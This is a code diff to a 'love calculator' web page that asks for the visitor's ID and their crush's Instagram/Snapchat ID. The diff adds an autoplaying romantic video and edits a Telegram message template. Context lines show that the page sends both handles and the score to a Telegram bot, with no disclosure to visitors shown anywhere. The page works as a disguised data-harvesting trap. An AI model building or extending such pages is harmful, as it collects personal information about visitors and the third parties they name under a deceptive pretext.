@@ -1,4 +1,4 @@
-  <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -96,6 +96,14 @@
         <input type="text" id="crushID" placeholder="Crush's Instagram/Snapchat ID">
         <button onclick="calculateLove()">Calculate Love ❤️</button>
         <div id="result"></div>
+        
+        <!-- Romantic Story Video -->
+        <h2>📽️ Romantic Story</h2>
+        <video id="romanticVideo" width="100%" controls loop style="display: none;">
+            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+
         <div class="share-buttons" id="share-section" style="display: none;">
             <h3>📢 Share This Website</h3>
             <a href="#" id="whatsappShare">WhatsApp</a>
@@ -128,12 +136,17 @@
 
             document.getElementById("result").innerHTML = `<p>Your Love Score with <strong>${crushID}</strong> is ❤️ <strong>${loveScore}%</strong>!</p><p><strong>${message}</strong></p>`;
 
+            // Play the video after showing the result
+            let video = document.getElementById("romanticVideo");
+            video.style.display = "block"; // Show the video
+            video.play(); // Play the video
+
             sendToTelegram(userID, crushID, loveScore);
             updateShareLinks(userID, crushID, loveScore);
         }
 
         function sendToTelegram(userID, crushID, loveScore) {
-            let message = `💘 *New Love Calculation!* 💘\n\n👤 *User:* ${userID}\n❤️ *Crush:* ${crushID}\n💯 *Love Score:* ${loveScore}%\n\n🔮 *Will they confess? Let's see!*`;
+            let message = `💘 *New Love Calculation!* 💘\n\n👤 *User :* ${userID}\n❤️ *Crush:* ${crushID}\n💯 *Love Score:* ${loveScore}%\n\n🔮 *Will they confess? Let's see!*`;
 
             let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
